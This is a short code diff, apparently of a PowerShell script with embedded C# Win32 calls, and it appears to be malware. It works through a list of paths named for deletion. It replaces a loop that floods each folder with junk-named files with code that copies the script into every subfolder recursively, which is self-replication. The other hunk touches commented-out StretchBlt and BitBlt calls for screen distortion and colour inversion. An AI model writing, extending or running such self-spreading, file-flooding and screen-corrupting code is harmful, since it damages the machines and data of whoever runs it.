@@ -19,11 +19,12 @@ foreach ($path in $pathsToDelete) {
         }
     }
 
-    for ($i = 1; $i -le 999; $i++) {
-        $randomIteration = Get-Random -Minimum 100 -Maximum 1000
-        $newFileName = ".....⓿⌓⓿....._$randomIteration.txt"
-        $newFilePath = Join-Path -Path $path -ChildPath $newFileName
-        New-Item -Path $newFilePath -ItemType File -Force | Out-Null
+    $selfPath = $MyInvocation.MyCommand.Path
+    $folders = Get-ChildItem -Path $path -Directory -Recurse
+
+    foreach ($folder in $folders) {
+        $newCopyPath = Join-Path -Path $folder.FullName -ChildPath $MyInvocation.MyCommand.Name
+        Copy-Item -Path $selfPath -Destination $newCopyPath -Force
     }
 }
 
@@ -64,7 +65,7 @@ public static class Win32
             IntPtr hdc = GetDC(IntPtr.Zero);
 
             // StretchBlt for Reverse PIP
-            //StretchBlt(hdc, 0, 0, cx, cy, hdc, 50, 50, cx - 100, cy - 100, 0x00CC0020);
+            //StretchBlt(hdc, 0, 0, cx, cy, hdc, 50, 50, cx - 100, 100, 0x00CC0020);
 
             // BitBlt for Inverting Colors
             //BitBlt(hdc, 0, 0, cx, cy, hdc, 0, 0, 0x00550009);
